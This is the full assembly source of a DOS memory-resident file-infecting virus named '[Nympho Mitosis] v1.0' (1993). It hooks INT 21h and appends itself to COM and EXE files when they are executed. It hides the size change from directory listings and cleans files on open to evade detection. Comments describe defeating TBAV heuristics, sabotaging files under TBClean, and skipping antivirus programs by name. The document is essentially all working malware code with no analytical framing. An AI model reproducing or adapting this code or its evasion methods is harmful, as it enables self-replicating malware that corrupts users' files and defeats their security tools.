       .model   tiny                                ;_ASSUME CS=DS=ES=SS
       .code                                        ;/
        org     100h                                ;Origin @ 100h (COM File)
                                                    ;
start:                                              ;Marks Start of Source
v_start:                                            ;Marks Start of Virus
        mov     bp,000h  ;<д© Constantly            ;** Get Rid of TBAV's
delta   equ     $-002h   ;<ды Changing              ;** Flexible Entry Point
                                                    ;
        push    ds es                               ;Save Segments onto Stack
                                                    ;
        mov     ax,5D3Dh                            ;AX=5D3Dh / CHECKRESIDENT
        int     021h                                ;DOS Services
                                                    ;
        cmp     ax,003Dh                            ;Is the Virus Resident?
        je      restoreCOMEXEfile                   ;Jump if Equal/Zero
                                                    ;
        cwd                                         ;Load Register w/Zero
        mov     ds,dx                               ;DS=>Starting of INT Table
        xchg    di,dx                               ;Load Register w/Zero
                                                    ;
        lds     ax,dword ptr ds:[084h]              ;Load Far Pointer to DS:AX
        mov     word ptr cs:[bp+Int21hOffset],ax    ;Save Interrupt Offset
        mov     word ptr cs:[bp+Int21hSegment],ds   ;Save Interrupt Segment
                                                    ;
        mov     ax,es                               ;ES=PSP=AX
        dec     ax                                  ;Decrement for Last MCB
        mov     ds,ax                               ;AX=Last MCB=DS
                                                    ;
        cmp     byte ptr ds:[di+000h],05Ah          ;Is MCB Last in Chain?
        jne     restoreCOMEXEfile                   ;Jump if Not Equal/Zero
                                                    ;
        mov     byte ptr ds:[di+000h],04Dh          ;Mark MCB as NOT Last
        sub     word ptr ds:[di+003h],(heap_end-v_start+100h+015d)/016d+001h
        sub     word ptr ds:[di+012h],(heap_end-v_start+100h+015d)/016d+001h
                                                    ;
        mov     ax,word ptr ds:[di+012h]            ;AX=Location of Virus MCB
                                                    ;
        mov     ds,ax                               ;DS=Location of Virus MCB
        inc     ax                                  ;Increment for Mem Loc
        mov     es,ax                               ;AX=Memory Location=ES
                                                    ;
        mov     byte ptr ds:[di+000h],05Ah          ;Mark MCB as Last in Chain
        mov     word ptr ds:[di+001h],008h          ;Mark DOS as Owner of MCB
        mov     word ptr ds:[di+003h],(heap_end-v_start+100h+015d)/016d
                                                    ;
        push    cs                                  ;Push Segment onto Stack
        pop     ds                                  ;Restore into DS (CS=DS)
                                                    ;
        cld                                         ;Clear Direction Flag
        mov     di,100h                             ;DI=Location in Memory
        lea     si,[bp+v_start]                     ;SI=Source of Data
        mov     cx,(heap_end-v_start)/002h          ;CX=Number of Bytes
        rep     movsw                               ;Word @ DS:[SI]=>ES:[DI]
                                                    ;
        mov     ds,cx                               ;CX=000h=DS=Int Table
                                                    ;
        cli                                         ;Turn OFF Interrupts
        mov     word ptr ds:[084h],offset Int21Handler
        mov     word ptr ds:[086h],es               ;Location in Memory
        sti                                         ;Turn ON Interrupts
                                                    ;
restoreCOMEXEfile:                                  ;
        pop     es ds                               ;Restore Segments
                                                    ;
        mov     ax,5A4Dh                            ;AX=5A4Dh (MZ)
        lea     si,cs:[bp+host_bytes]               ;SI=Host_Bytes
                                                    ;
        cmp     ax,word ptr cs:[si+000h]            ;Is an EXE Our Host?
        je      restoreEXEfile                      ;Jump if Equal/Zero
                                                    ;
        xchg    ah,al                               ;Exchange Registers (ZM)
                                                    ;
        cmp     ax,word ptr cs:[si+000h]            ;Is an EXE Our Host?
        je      restoreEXEfile                      ;Jump if Equal/Zero
                                                    ;
restoreCOMfile:                                     ;
        mov     di,0FFh                             ;DI=Location in Memory
        inc     di                                  ;Increment for Real Loc
        push    di                                  ;Push DI onto Stack
        mov     byte ptr [di],0C3h                  ;** Here, we screw up
                                                    ;** the file _if_ TBClean
        call    di                                  ;** is being run. 
                                                    ;** Thanks LM!
        movsw                                       ;Word @ DS:[SI]=>ES:[DI]
        movsb                                       ;Byte @ DS:[SI]=>ES:[DI]
                                                    ;
        retn                                        ;Return to Host Program
                                                    ;
restoreEXEfile:                                     ;
        mov     ax,es                               ;ES=PSP=AX
                                                    ;
        add     ax,010h                             ;Skip One Segment for CS
        add     ax,word ptr cs:[si+016h]            ;Calculate Start of Prog
                                                    ;
        push    ax                                  ;Push New CS to Stack
        push    word ptr cs:[si+014h]               ;Push IP to Stack
                                                    ;
        retf                                        ;Return to Host Program
                                                    ;
        db      "[Nympho Mitosis] v1.0",000h        ;Le Nom du Virus
        db      "Copyright (c) 1993 Memory Lapse",000h
                                                    ;
Int21Handler:                                       ;
        cmp     ax,5D3Dh                            ;Is Virus Checking?
        jne     check_execute                       ;Jump if Not Equal/Zero
                                                    ;
        cbw                                         ;Convert AL to AX
                                                    ;
        iret                                        ;Interrupt Return
                                                    ;
check_execute:                                      ;
        cmp     ah,011h                             ;Are We Doing a DIR?
        je      _FCBStealth                         ;Jump if Equal/Zero
                                                    ; (DOS)
        cmp     ah,012h                             ;Are We Doing a DIR?
        je      _FCBStealth                         ;Jump if Equal/Zero
                                                    ; (DOS)
        cmp     ah,04Eh                             ;Are We Doing a DIR?
        je      _DTAStealth                         ;Jump if Equal/Zero
                                                    ; (4DOS)
        cmp     ah,04Fh                             ;Are We Doing a DIR?
        je      _DTAStealth                         ;Jump if Equal/Zero
                                                    ; (4DOS)
        push    ax bx cx dx di si ds es             ;Push Registers onto Stack
                                                    ;
        cmp     ax,6C00h                            ;Are We Extended Opening?
        je      __disinfectCOMEXEfile               ;Jump if Equal/Zero
                                                    ;
        cmp     ah,03Dh                             ;Are We Opening?
        je      _disinfectCOMEXEfile                ;Jump if Equal/Zero
                                                    ;
        dec     ax                                  ;** Get Rid of TBAV's
                                                    ;** Traps Loading of SW. 
        cmp     ax,4AFFh                            ;Are We Executing?
        je      _infectCOMEXEfile                   ;Jump if Equal/Zero
                                                    ;
_Interrupt21h:                                      ;
        pop     es ds si di dx cx bx ax             ;Restore Registers
                                                    ;
Interrupt21h:                                       ;
        db      0EAh,000h,000h,000h,000h            ;JMP FAR PTR SSSS:OOOO
                                                    ;
Int21hOffset    equ     $-004h                      ;Buffer for Int 21 Offset
Int21hSegment   equ     $-002h                      ;Buffer for Int 21 Segment
                                                    ;
_FCBStealth:                                        ;
        jmp     FCBStealth                          ;Unconditional Jump
                                                    ;
_DTAStealth:                                        ;
        jmp     DTAStealth                          ;Unconditional Jump
                                                    ;
_infectCOMEXEfile:                                  ;
        jmp     infectCOMEXEfile                    ;Unconditional Jump
                                                    ;
__disinfectCOMEXEfile:                              ;
        xchg    dx,si                               ;SI=File Name=>DX
                                                    ;
_disinfectCOMEXEfile:                               ;
        jmp     disinfectCOMEXEfile                 ;Unconditional Jump
                                                    ;
FCBStealth:                                         ;
        pushf                                       ;Push Flags to Top of Stck
        push    cs                                  ;Push Segment onto Stack
        call    Interrupt21h                        ;Simulate Interrupt
                                                    ;
        test    al,al                               ;Was There an Error?
        jnz     endFCBstealth                       ;Jump if Not Equal/Zero
                                                    ;
        push    es dx cx bx ax                      ;Push Registers onto Stack
                                                    ;
        mov     ah,051h                             ;AH=51h / GET PSP ADDRESS
        int     021h                                ;DOS Services
                                                    ;
        mov     es,bx                               ;BX=Address=ES
                                                    ;
        cmp     bx,word ptr es:[016h]               ;Is This a Parent PSP?
        jne     restoreFCBregisters                 ;Jump if Not Equal/Zero
                                                    ;
        mov     bx,dx                               ;DX=BX
        mov     al,[bx]                             ;Get First Byte of FCB
                                                    ;
        push    ax                                  ;Save Byte onto Stack
                                                    ;
        mov     ah,02Fh                             ;AH=2Fh / GET DTA ADDRESS
        int     021h                                ;DOS Services
                                                    ;
        pop     ax                                  ;Restore AX
                                                    ;
        inc     al                                  ;Is This an Extended FCB?
        jnz     checkFCBinfected                    ;Jump if Not Equal/Zero
                                                    ;
        add     bx,007h                             ;Convert to Normal FCB
                                                    ;
checkFCBinfected:                                   ;
        mov     cx,word ptr es:[bx+017h]            ;CX=Time
        mov     dx,word ptr es:[bx+019h]            ;DX=Date
                                                    ;
        and     cx,01Fh                             ;Unmask Seconds Field
        and     dx,01Fh                             ;Unmask Day Field
                                                    ;
        xor     cx,dx                               ;Are They the Same?
        jnz     restoreFCBregisters                 ;Jump if Not Equal/Zero
                                                    ;
        sub     word ptr es:[bx+01Dh],(v_end-v_start);Subtract Virus Length
        sbb     word ptr es:[bx+01Fh],000h          ;Subtract if Borrow
                                                    ;
restoreFCBregisters:                                ;
        pop     ax bx cx dx es                      ;Restore Registers
                                                    ;
endFCBstealth:                                      ;
        iret                                        ;Interrupt Return
                                                    ;
DTAStealth:                                         ;
        pushf                                       ;Push Flags to Top of Stck
        push    cs                                  ;Push Segment onto Stack
        call    Interrupt21h                        ;Simulate Interrupt
                                                    ;
        jc      endDTAstealth                       ;Jump if Carry Flag Set
                                                    ;
        push    es dx cx bx ax                      ;Save Registers onto Stack
                                                    ;
        mov     ah,02Fh                             ;AH=2Fh / GET PSP ADDRESS
        int     021h                                ;DOS Services
                                                    ;
        mov     cx,word ptr es:[bx+016h]            ;CX=Time
        mov     dx,word ptr es:[bx+018h]            ;DX=Date
                                                    ;
        and     cx,01Fh                             ;Unmask Seconds Field
        and     dx,01Fh                             ;Unmask Day Field
                                                    ;
        xor     cx,dx                               ;Are They the Same?
        jnz     restoreDTAregisters                 ;Jump if Not Equal/Zero    
                                                    ;
        sub     word ptr es:[bx+01Ah],(v_end-v_start);Subtract Virus Size
        sbb     word ptr es:[bx+01Ch],000h          ;Subtract if Borrow
                                                    ;
restoreDTAregisters:                                ;
        pop     ax bx cx dx es                      ;Restore Registers
                                                    ;
endDTAstealth:                                      ;
        retf    002h                                ;Return Far (POP 2 WORDS)
                                                    ;
disinfectCOMEXEfile:                                ;
        call    OpenAndGetSFT                       ;Call Procedure
                                                    ;
        mov     cx,word ptr es:[di+00Dh]            ;CX=Time
        mov     dx,word ptr es:[di+00Fh]            ;DX=Date
                                                    ;
        and     cx,01Fh                             ;Unmask Seconds Field
        and     dx,01Fh                             ;Unmask Day Field
                                                    ;
        xor     cx,dx                               ;Are They the Same?
        jnz     disinfect_close                     ;Jump if Not Equal/Zero
                                                    ;
        call    LSeek                               ;Move File Pointer to End
                                                    ;
        xchg    cx,dx                               ;Exchange Register Values
        xchg    dx,ax                               ;Exchange Register Values
                                                    ;
        push    dx cx                               ;Save File Size to Stack
                                                    ;
        sub     dx,018h                             ;Subtract 18 for Host_Byte
        sbb     cx,000h                             ;Subtract if Borrow
                                                    ;
        mov     word ptr es:[di+015h],dx            ;Move File Pointer to 
        mov     word ptr es:[di+017h],cx            ;Starting of Host_Bytes
                                                    ;
        mov     dx,offset temp_buffer               ;DX=Buffer for Data
        mov     cx,018h                             ;CX=Number of Bytes
        mov     ah,03Fh                             ;AH=3Fh / READ
        int     021h                                ;DOS Services
                                                    ;
        mov     word ptr es:[di+015h],000h          ;Move File Pointer to 
        mov     word ptr es:[di+017h],000h          ;Starting of File (SFT)
                                                    ;
        mov     ah,040h                             ;AH=40h / WRITE
        int     021h                                ;DOS Services    
                                                    ;
        pop     cx dx                               ;Restore File Size
                                                    ;
        sub     dx,(v_end-v_start)                  ;Subtract Virus Size
        sbb     cx,000h                             ;Subtract if Borrow
                                                    ;
        mov     word ptr es:[di+015h],dx            ;Move File Pointer to 
        mov     word ptr es:[di+017h],cx            ;Starting of Virus
                                                    ;
        sub     cx,cx                               ;Load Register w/Zero
        mov     ah,040h                             ;AH=40h / WRITE
        int     021h                                ;DOS Services
                                                    ;
        mov     cx,word ptr es:[di+00Dh]            ;CX=Time
        and     cl,0E0h                             ;Unmask Seconds Field
        or      cl,008h                             ;Set Seconds to 016d
        mov     dx,word ptr es:[di+00Fh]            ;DX=Date
                                                    ;
        jmp     preCLOSECOMEXEfile                  ;Unconditional Jump
                                                    ;
disinfect_close:                                    ;
        jmp     closeCOMEXEfile                     ;Unconditional Jump
                                                    ;
infectCOMEXEfile:                                   ;
        call    OpenAndGetSFT                       ;Call Procedure
                                                    ;
        mov     cx,word ptr es:[di+00Dh]            ;CX=Time
        mov     dx,word ptr es:[di+00Fh]            ;DX=Date
                                                    ;
        and     cx,01Fh                             ;Unmask Seconds Field
        and     dx,01Fh                             ;Unmask Day Field
                                                    ;
        xor     cx,dx                               ;Are They the Same?
        jz      _closeCOMEXEfile                    ;Jump if Equal/Zero
                                                    ;
        cmp     word ptr es:[di+020h],'BT'          ;Could It Be ThunderByte?
        je      _closeCOMEXEfile                    ;Jump if Equal/Zero
                                                    ;
        cmp     word ptr es:[di+020h],'-F'          ;Could it Be F-Prot?
        je      _closeCOMEXEfile                    ;Jump if Equal/Zero
                                                    ;
        cmp     word ptr es:[di+020h],'CS'          ;Could it Be ViruScan?
        je      _closeCOMEXEfile                    ;Jump if Equal/Zero
                                                    ;
        cmp     word ptr es:[di+020h],'LC'          ;Could it Be Clean?
        je      _closeCOMEXEfile                    ;Jump if Equal/Zero
                                                    ;
        mov     dx,offset host_bytes                ;DX=Buffer for Data
        mov     cx,018h                             ;CX=Number of Bytes
        mov     ah,03Fh                             ;AH=3Fh / READ
        int     021h                                ;DOS Services
                                                    ;
        mov     word ptr es:[di+015h],000h          ;Move File Pointer to
        mov     word ptr es:[di+017h],000h          ;Starting of File (SFT)
                                                    ;
        mov     si,offset temp_buffer               ;SI=Temp_buffer
                                                    ;
        mov     ax,4D5Ah                            ;** Get Rid of TBAV's
                                                    ;** EXE/COM Determination
        cmp     ax,word ptr [host_bytes+000h]       ;Is This an EXE File?
        je      infectEXEfile                       ;Jump if Equal/Zero
                                                    ;
        xchg    ah,al                               ;Exchange Registers (MZ)
                                                    ;
        cmp     ax,word ptr [host_bytes+000h]       ;Is This an EXE File?
        je      infectEXEfile                       ;Jump if Equal/Zero
                                                    ;
infectCOMfile:                                      ;
        call    LSeek                               ;Move File Pointer to End
                                                    ;
        mov     word ptr [delta],ax                 ;Write New Delta Offset
                                                    ;
        sub     ax,003h                             ;Subtract 03 for JMP Loc
        mov     byte ptr [si+000h],0E9h             ;Write JMP to Buffer
        mov     word ptr [si+001h],ax               ;Write JMP Loc to Buffer
                                                    ;
        mov     cx,003h                             ;CX=Number of Bytes
        push    cx                                  ;Push Register onto Stack
                                                    ;
        jmp     continueCOMEXEinfect                ;Unconditional Jump
                                                    ;
_closeCOMEXEfile:                                   ;
        jmp     closeCOMEXEfile                     ;Unconditional Jump
                                                    ;
infectEXEfile:                                      ;
        mov     dx,si                               ;DX=Buffer for Data
        push    cx                                  ;CX=Number of Bytes
        mov     ah,03Fh                             ;AH=3Fh / READ
        int     021h                                ;DOS Services
                                                    ;
        call    LSeek                               ;Move File Pointer to End
                                                    ;
        push    dx ax                               ;Push File Size onto Stack
                                                    ;
        add     ax,(v_end-v_start)                  ;Add Virus Size to Low Bit
        adc     dx,000h                             ;Add if Carry to High Bit
                                                    ;
        mov     cx,200h                             ;CX=Number to Divide By
        div     cx                                  ;Divide AX by CX
                                                    ;
        or      dx,dx                               ;Do We Need to Round Up?
        je      no_burp                             ;Jump if Equal/Zero
                                                    ;
        inc     ax                                  ;Increment AX
                                                    ;
no_burp:                                            ;
        mov     word ptr [si+004h],ax               ;New Length of File Ж 512
        mov     word ptr [si+002h],dx               ;New # of Bytes in Last Pg
                                                    ;
        pop     ax dx                               ;Restore File Size
                                                    ;
        mov     cx,010h                             ;CX=Number to Divide By
        div     cx                                  ;Divide AX by CX
                                                    ;
        sub     ax,word ptr [si+008h]               ;Subtact Header Size
                                                    ;
        mov     word ptr [si+016h],ax               ;CS=Segment of Virus
        mov     word ptr [si+014h],dx               ;IP=Location of Virus
                                                    ;
        sub     dx,100h                             ;Subtract 100h for Offset
        mov     word ptr [delta],dx                 ;Write New Delta Offset
                                                    ;
continueCOMEXEinfect:                               ;
        mov     dx,offset v_start                   ;DX=Location of Data
        mov     cx,(v_end-v_start)                  ;CX=Number of Bytes
        mov     ah,040h                             ;AH=40h / WRITE
        int     021h                                ;DOS Services
                                                    ;
        mov     word ptr es:[di+015h],000h          ;Move File Pointer to 
        mov     word ptr es:[di+017h],000h          ;Starting of File (SFT)
                                                    ;
        xchg    dx,si                               ;DX=Location of Data
        pop     cx                                  ;CX=Number of Bytes
        mov     ah,040h                             ;AH=40h / WRITE
        int     021h                                ;DOS Services
                                                    ;
        mov     cx,word ptr es:[di+00Dh]            ;CX=Time
        mov     dx,word ptr es:[di+00Fh]            ;DX=Date
                                                    ;
        push    dx                                  ;Push Date Stamp to Stack
                                                    ;
        and     cx,-020h                            ;Reset Seconds
        and     dx,01Fh                             ;Unmask Day Field
                                                    ;
        or      cx,dx                               ;Move Day into Seconds
                                                    ;
        pop     dx                                  ;Restore Date
                                                    ;
preCLOSECOMEXEfile:                                 ;
        mov     ax,5701h                            ;AX=5701h / SET T/D STAMPS
        int     021h                                ;DOS Services
                                                    ;
closeCOMEXEfile:                                    ;
        mov     ah,03Eh                             ;AH=3Eh / CLOSE File
        int     021h                                ;DOS Services
                                                    ;
        jmp     _Interrupt21h                       ;Unconditional Jump
                                                    ;
OpenAndGetSFT:                                      ;
        mov     ax,3D00h                            ;AX=3D00h / OPEN R/O
        pushf                                       ;Push Flags to Top of Stck
        push    cs                                  ;Push Segment to Stack
        call    Interrupt21h                        ;Simulate Interrupt
                                                    ;
        xchg    ax,bx                               ;Move File Handle to BX
                                                    ;
        push    bx cs cs                            ;Push Registers to Stack
        pop     es ds                               ;Equal Out Segments
                                                    ;
        mov     ax,1220h                            ;AX=1220h / GET JFT
        int     02Fh                                ;Multiplex Interrupt
                                                    ;
        mov     ax,1216h                            ;AX=1216h / GET SFT
        mov     bl,byte ptr es:[di]                 ;Move Byte into BL
        int     02Fh                                ;Multiplex Interrupt
                                                    ;
        pop     bx                                  ;Restore File Handle
                                                    ;
        mov     word ptr es:[di+002h],002h          ;Open in Read/Write Mode
                                                    ;
        retn                                        ;Return to Point of Call
                                                    ;
LSeek:  push    ds                                  ;Push Segment onto Stack                  
                                                    ;
        lds     ax,dword ptr es:[di+011h]           ;Load Far Pointer to DS:AX
        mov     word ptr es:[di+015h],ax            ;Move File Pointer to 
        mov     word ptr es:[di+017h],ds            ;End of File.  (SFT)
        mov     dx,ds                               ;Move High Bit to DX
                                                    ;
        pop     ds                                  ;Restore Segment to DS
                                                    ;
        retn                                        ;Return to Point of Call
                                                    ;
host_bytes      dw      020CDh     ;First 3 for COM ;Marks Host as an EXE
                dw      002h                        ;# of Bytes @ Last Page
                dw      004h                        ;# of Pages + Header Size
                dw      006h                        ;# of Relocatable Entries
                dw      008h                        ;Size of Header (Paras)
                dw      00Ah                        ;Min. Memory Required
                dw      00Ch                        ;Max. Memory Wanted
                dw      00Eh                        ;SS Value at Entry
                dw      010h                        ;SP Value at Entry
                dw      012h                        ;Negative Checksum
                dw      014h                        ;IP Value at Entry
                dw      016h                        ;CS Value at Entry
                                                    ;
v_end:                                              ;Marks End of Virus
heap_start:                                         ;Marks Start of Heap
                                                    ;
temp_buffer     db      018h dup (?)                ;Multipurpose Buffer
                                                    ;
heap_end:                                           ;Marks End of Heap
                                                    ;
end     start                                       ;Marks End of Source
